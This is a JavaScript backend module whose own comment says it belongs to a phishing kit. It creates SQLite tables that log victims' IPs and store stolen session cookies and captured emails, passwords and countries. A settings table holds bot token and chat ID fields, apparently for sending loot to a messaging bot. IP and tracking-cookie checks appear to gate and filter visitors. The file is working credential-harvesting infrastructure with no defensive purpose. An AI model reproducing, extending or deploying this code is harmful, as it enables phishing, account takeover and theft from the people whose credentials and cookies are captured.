// db.js
// Legacy entry point — kept for any external consumers (e.g. the original phishing kit).
// All database logic is now handled by Drizzle ORM in lib/db.ts.
// This file re-exports thin class wrappers that delegate to Drizzle internally.

const Database = require('better-sqlite3');
const fs = require('fs');
const path = require('path');

// Auto-create db directory if it does not exist
const dbDir = path.join(process.cwd(), 'db');
if (!fs.existsSync(dbDir)) {
  fs.mkdirSync(dbDir, { recursive: true });
}

class MainDatabase {
  constructor() {
    this.db = new Database(path.join(dbDir, 'ceng.db'));
    this._setupTables();
  }

  _setupTables() {
    this.db.exec(`
      CREATE TABLE IF NOT EXISTS clients (
        sessionId TEXT PRIMARY KEY,
        client_ip TEXT NOT NULL,
        first_seen TEXT NOT NULL,
        last_seen TEXT NOT NULL
      );
      CREATE TABLE IF NOT EXISTS client_cookies (
        sessionId TEXT NOT NULL,
        timestamp TEXT NOT NULL,
        cookies TEXT NOT NULL,
        FOREIGN KEY(sessionId) REFERENCES clients(sessionId)
      );
      CREATE TABLE IF NOT EXISTS credentials (
        sessionId TEXT NOT NULL,
        timestamp TEXT NOT NULL,
        email TEXT NOT NULL,
        password TEXT NOT NULL,
        country TEXT NOT NULL DEFAULT 'Unknown',
        FOREIGN KEY(sessionId) REFERENCES clients(sessionId)
      );
    `);
  }

  updateClient(sessionId, client_ip) {
    const now = new Date().toISOString();
    this.db.prepare(`
      INSERT INTO clients (sessionId, client_ip, first_seen, last_seen)
      VALUES (?, ?, ?, ?)
      ON CONFLICT(sessionId) DO UPDATE SET
        client_ip = excluded.client_ip,
        last_seen = excluded.last_seen
    `).run(sessionId, client_ip, now, now);
  }

  storeCookies(sessionId, client_ip, cookies) {
    const now = new Date().toISOString();
    const store = this.db.transaction(() => {
      this.updateClient(sessionId, client_ip);
      this.db.prepare(
        'INSERT INTO client_cookies (sessionId, timestamp, cookies) VALUES (?, ?, ?)'
      ).run(sessionId, now, JSON.stringify(cookies));
    });
    store();
  }

  storeCredentials(sessionId, client_ip, cred) {
    const now = new Date().toISOString();
    const [email, password, country] = cred;
    const store = this.db.transaction(() => {
      this.updateClient(sessionId, client_ip);
      this.db.prepare(
        'INSERT INTO credentials (sessionId, timestamp, email, password, country) VALUES (?, ?, ?, ?, ?)'
      ).run(sessionId, now, email, password, country || 'Unknown');
    });
    store();
  }
}

class ConfigDatabase {
  constructor() {
    this.db = new Database(path.join(dbDir, 'config.db'));
    this._setupTables();
    this._initDefaults();
  }

  _setupTables() {
    this.db.prepare(`
      CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT NOT NULL DEFAULT '')
    `).run();
  }

  _initDefaults() {
    const defaults = { BOT_TOKEN: '', CHAT_ID: '', H_KEY: '', R_KEY: '', LANDING_URL: '' };
    const stmt = this.db.prepare('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)');
    for (const [key, value] of Object.entries(defaults)) {
      stmt.run(key, value);
    }
  }

  getSetting(key) {
    const row = this.db.prepare('SELECT value FROM settings WHERE key = ?').get(key);
    return row ? row.value : null;
  }

  setSetting(key, value) {
    this.db.prepare(
      'INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)'
    ).run(key, value);
  }
}

class SecurityDatabase {
  constructor() {
    this.db = new Database(path.join(dbDir, 'security.db'));
    this.db.pragma('journal_mode = WAL');
    this._setupTables();
  }

  _setupTables() {
    this.db.exec(`
      CREATE TABLE IF NOT EXISTS tokens (
        token TEXT PRIMARY KEY,
        created_at INTEGER DEFAULT (strftime('%s','now'))
      );
      CREATE TABLE IF NOT EXISTS tracking_cookies (
        cookie_value TEXT PRIMARY KEY,
        ip TEXT NOT NULL,
        created_at INTEGER DEFAULT (strftime('%s','now'))
      );
      CREATE TABLE IF NOT EXISTS ip_log (
        ip TEXT PRIMARY KEY,
        timestamp INTEGER NOT NULL
      );
    `);
  }

  storeIP(ip) {
    this.db.prepare(
      'INSERT OR REPLACE INTO ip_log (ip, timestamp) VALUES (?, ?)'
    ).run(ip, Date.now());
  }

  checkIP(ip) {
    const fiveMinutesAgo = Date.now() - 300_000;
    this.db.prepare('DELETE FROM ip_log WHERE timestamp < ?').run(fiveMinutesAgo);
    return !!this.db.prepare('SELECT 1 FROM ip_log WHERE ip = ? LIMIT 1').get(ip);
  }

  isValidToken(token) {
    return !!this.db.prepare('SELECT token FROM tokens WHERE token = ?').get(token);
  }

  storeTrackingCookie(cookieValue, ip) {
    this.db.prepare(
      'INSERT OR IGNORE INTO tracking_cookies (cookie_value, ip) VALUES (?, ?)'
    ).run(cookieValue, ip);
  }

  hasValidTrackingCookie(cookieValue, client_ip) {
    return !!this.db.prepare(`
      SELECT cookie_value FROM tracking_cookies
      WHERE cookie_value = ? AND ip = ?
        AND created_at > strftime('%s','now','-1 hour')
    `).get(cookieValue, client_ip);
  }
}

module.exports = { MainDatabase, ConfigDatabase, SecurityDatabase };
